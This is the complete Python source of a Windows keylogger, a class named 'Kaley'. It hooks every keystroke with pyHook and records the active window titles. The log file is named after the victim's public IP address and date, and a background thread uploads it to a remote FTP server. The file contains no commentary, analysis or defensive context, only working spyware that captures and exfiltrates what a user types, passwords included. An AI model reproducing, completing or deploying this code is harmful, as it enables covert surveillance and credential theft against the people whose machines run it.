    # coding= utf-8
    import pythoncom, pyHook, ftplib, urllib, datetime, time, thread, os
     
    class Kaley:
        def __init__(self):
            self.current_window = None
            self.namefile = str(self.getIP()) + " - " + str(self.getDate()) + ".txt"
            self.f = ftplib.FTP("server")
            self.f.login("user", "pass")
            self.f.cwd("/html/kaley")
            self.run = False
     
        def getIP(self):
            url = urllib.URLopener()
            resp = url.open("http://automation.whatismyip.com/n09230945.asp")
            html = resp.read(114)
            return html
     
        def getDate(self):
            now = datetime.datetime.now()
            return now.strftime("%Y-%m-%d")
     
        def write(self, text):
            file = open(self.namefile, "a")
            file.write(text)
            file.close()
            if self.run == False:
                thread.start_new_thread(self.upload, ())
     
        def upload(self):
            self.run = True
            time.sleep(5)
            self.f.storbinary("STOR " + self.namefile, open(self.namefile, "rb"))
            self.run = False
     
        def stroke(self, event):
            if event.WindowName != self.current_window:
                self.write("\n" + event.WindowName + "\n")
                self.current_window = event.WindowName
            if event.Ascii == 32 or event.Ascii == 9:
                 self.write(" ")
            elif event.Ascii == 241 or event.Ascii == 209:
                self.write("Ñ")
            elif event.Ascii == 13:
                self.write("\n")
            else:
                self.write(event.Key)
     
    log = Kaley()
    ph = pyHook.HookManager()
    ph.KeyDown = log.stroke
    ph.HookKeyboard()
    pythoncom.PumpMessages()
